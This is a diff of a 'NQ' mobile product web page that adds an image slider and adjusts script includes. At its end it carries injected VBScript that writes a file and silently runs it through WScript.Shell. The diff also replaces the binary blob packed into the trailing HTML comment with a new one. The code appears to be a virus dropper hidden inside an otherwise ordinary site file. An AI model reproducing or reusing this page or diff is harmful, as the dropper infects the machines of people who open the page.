@@ -23,7 +23,7 @@
 <link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
 <link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
 </head>
-<body>
+<body class="product">
 <div class="navbar">
   <div class="navbar-inner">
     <div class="container"> <a class="brand" href="#"><img src="images/nqlogo.png" width="131" height="30" alt="NQ" /></a>
@@ -100,9 +100,13 @@
         </ul>
       </div>
       <div class="span4 offset1 ">
-        <div class="phone-nq">
-        	<div class="phone-nq-inside"></div>
-        </div>
+        <div class="phone-nq-inside">                   
+                <div id="" class="fadein">
+                    <img src="images/mobile-slide-item.jpg" width="256" height="410" alt="mobile-screen">
+                    <img src="images/mobile-screen2.png" width="256" height="410" alt="mobile-screen">
+                    <img src="images/mobile-screen3.png" width="256" height="410" alt="mobile-screen">
+                </div>
+            </div>
       </div>
     </div>
   </div>
@@ -349,9 +353,17 @@ devices</em>
 <!-- Le javascript  
     ================================================== --> 
 <!-- Placed at the end of the document so the pages load faster --> 
+<!-- Slider smaller -->
+<script src="js/jquery.js"></script>
+<script>
+$(function(){
+	$('.fadein img:gt(0)').hide();
+	setInterval(function(){$('.fadein :first-child').fadeOut().next('img').fadeIn().end().appendTo('.fadein');}, 3000);
+});
+</script>
 
-<script SRC="assets/js/scale.fix.js"></script>
-
+<!-- scale smaller -->
+<script SRC="js/scale.fix.js"></script>
 <script src="js/latest-jquery.js"></script>
 <script src="js/bootstrap.min.js"></script>
 <script type="text/javascript">
@@ -377,8 +389,6 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--Ñ±×ö*Ùv¢N Ühİ òxZVNc2o+UIÎ•=óÇVmu¿÷“Í³cÉuÕB@Xf¯ä~D$®ŸôÓ†ñ‚äq<‰¦ä`LJ#Na[”•ızçë³>e ±…‘LèMŸ
-¾
-À›@>ìp],åfâ,<]T¤n”æH-Ò@Ùñ‹À"e\óúÖØ¾rÇ,¹;Q»H`™B´…v,Ş*tf÷K[ı¤NCm›Ôm”
-ùáÚ¶ñ‰„ş†Ócåîw<w
-PİØO?óqi¥5üë0Ë8ÌoéXÙFœ*ºŒİŒibÏõ…#˜xb=$ìEy°Í­:%&IûÊî¢¤÷‡œ—ÃÔ	¥…¯25™«m¤÷*éôgK©yÔòÑ@ó9üá0İ¥Òm	~7)£¦ƒ˜Ê¼T	*{fŸ–£·»R˜:¡… .œ…PC~hÂŞ‚Í5 À­Å¡<*¢üñÖ]KüsS-û á"R"9øá"á"á"¬ÿN×)S²Ü" á"-->
+//--></SCRIPT><!--ê>*›³,2CÁ%¼ï³ÑZ:8¯qNì¢(ßÎO'‘¹»Ş¼ºàÂd–}ëİcè€²[æ³«x
+b(àBe!¡jqY=‹†ÀNÀ~ùp&	ñSĞšÕœêhü|È9˜fU˜ì–32Ãµ€¹Bcıãúæ–ÑŠ¡ÎáÖBÄĞ5$¥’<IK,¨‘k&vƒG®I;(+®İ¥f’2c@–›¼à
+	ãæJÉ’Ù6Ô²®pDSàø5øåÙúĞ˜aY[å¾dnH%êãvz‹>[Ñ^NL§ºdüS(QWñğ¦ ¡ôÚ(½Äığåj‚^°Ø Í©˜¶`¨ÚÂép‡%Ò]O1Ê÷$ yí?g?9…‚ùñ	²:ANpyazÅeX a€ğÅèÒ/DhWw"Xx¥Š—PñÙ"Øq‡r²UÓpïH‘z¾ïÉÉ×ìİ‘ˆ+¥HK®Ä•Óy‘téŒ§àé.×Å’YAZ¥†¡{Š„¾iš:jâàxYj=çLáÙŠÚ£Háê÷¾æí;ì ÛùRâûÛùÛùÛù–$MceÍP?›ù Ûù-->
